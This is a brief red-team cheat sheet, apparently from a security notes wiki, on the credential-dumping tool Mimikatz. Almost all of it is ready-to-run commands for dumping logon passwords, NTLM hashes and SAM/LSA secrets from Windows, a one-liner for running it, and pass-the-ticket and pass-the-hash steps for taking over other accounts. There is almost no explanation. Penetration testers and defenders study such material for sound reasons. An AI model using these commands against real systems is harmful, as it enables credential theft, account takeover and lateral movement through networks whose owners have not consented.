---
title: MImikatz
parent: Tools
grand_parent: Red Team
nav_order: 8
---
# Mimikatz

Administrator privileges required
Mimikatz is a tool for dumping passwords and hashes from Windows systems.

---
### Basic Commands

## **Dumping Passwords and Hashes**

  ```bash
  privilege::debug
  sekurlsa::logonpasswords
  ```

## **Dumping SAM and LSA**

  ```bash
  lsadump::sam
  lsadump::lsa /patch
  ```

## **Running as a one-liner**

  ```bash
  .\mimikatz.exe “privilege::debug” “sekurlsa::logonpasswords” “exit”
  ```

## Pass the Ticket

```bash
sekurlsa::tickets /export
kerberos::ptt ticket.kirbi
```

## Pass The Hash

```bash
sekurlsa::logonpasswords
sekurlsa::pth /user:DOMAIN_USER /domain:DOMAIN /ntlm:HASH
```